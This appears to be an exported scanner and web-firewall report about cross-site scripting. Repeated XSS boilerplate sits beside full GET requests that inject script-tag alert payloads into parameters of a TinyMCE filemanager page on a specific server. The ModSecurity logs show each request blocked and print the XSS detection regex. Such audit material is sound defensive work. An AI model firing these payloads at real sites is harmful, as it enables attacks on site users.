 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac1cc89409</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >fldr</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=&quot;&gt;&lt;script&gt;alert(247499)&lt;/script&gt;&lt;!--&amp;551ac1cc89409=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=%22%3Ealert%28247499%29%2F; PHPSESSID=jclo8rlcr9b37objoaddj8fv04
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:27:06</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:27:05 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:fldr. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(247499)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtskawQAW0AAB7zKM4AAAAF&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtskawQAW0AAB7zKM4AAAAF</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366780</td><td class=xl24 width=64 >2015-03-31 19:07:14</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=&amp;551ac1cc4bcfb</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >551ac1cc4bcfb</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=TestName&amp;551ac1cc4bcfb=&quot;&gt;&lt;script&gt;alert(556599)&lt;/script&gt;&lt;!-- HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=gsa0ms7a1h620lfvmhklaj8sr5
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:27:08</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:27:06 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:551ac1cc4bcfb. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(556599)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtskqwQAW0AAHhGMtcAAAAK&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtskqwQAW0AAHhGMtcAAAAK</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366781</td><td class=xl24 width=64 >2015-03-31 19:07:45</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac1cc893bd</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >551ac1cc893bd</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac1cc893bd=&quot;&gt;&lt;script&gt;alert(828399)&lt;/script&gt;&lt;!-- HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=t8lgd0ta0q4as89gm3ias8vhh4
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:27:09</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:27:08 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:551ac1cc893bd. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(828399)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtslKwQAW0AAHzDqr0AAAAH&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtslKwQAW0AAHzDqr0AAAAH</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366782</td><td class=xl24 width=64 >2015-03-31 19:09:35</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac1cc89409</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >551ac1cc89409</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac1cc89409=&quot;&gt;&lt;script&gt;alert(921399)&lt;/script&gt;&lt;!-- HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=qahuchii3tlqvujhjn2l9gkkk1
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:27:10</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:27:09 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:551ac1cc89409. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(921399)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtslawQAW0AAD9hYNkAAAAC&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtslawQAW0AAD9hYNkAAAAC</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366783</td><td class=xl24 width=64 >2015-03-31 19:13:54</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >type</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=&quot;&gt;&lt;script&gt;alert(624599)&lt;/script&gt;&lt;!--&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=5l1jj3nte72h9qb8jb06a711j7
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:27:11</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:27:10 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:type. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(624599)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtslqwQAW0AAHewA80AAAAN&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtslqwQAW0AAHewA80AAAAN</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366784</td><td class=xl24 width=64 >2015-03-31 19:19:09</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >lang</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=&quot;&gt;&lt;script&gt;alert(193399)&lt;/script&gt;&lt;!--&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=jkfrh12fpho6hdl87vn927h833
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:27:13</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:27:11 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:lang. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(193399)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtsl6wQAW0AAHee9@kAAAAA&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsl6wQAW0AAHee9@kAAAAA</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366785</td><td class=xl24 width=64 >2015-03-31 19:22:47</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=&amp;551ac1cc4bcfb</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >type</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=&quot;&gt;&lt;script&gt;alert(761499)&lt;/script&gt;&lt;!--&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=TestName&amp;551ac1cc4bcfb=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=u0mpentsre2u25knrmc1tr2dc3
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:27:14</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:27:13 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:type. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(761499)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRtsmawQAW0AABvT@GkAAAAL&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRtsmawQAW0AABvT@GkAAAAL</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366786</td><td class=xl24 width=64 >2015-03-31 19:23:03</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


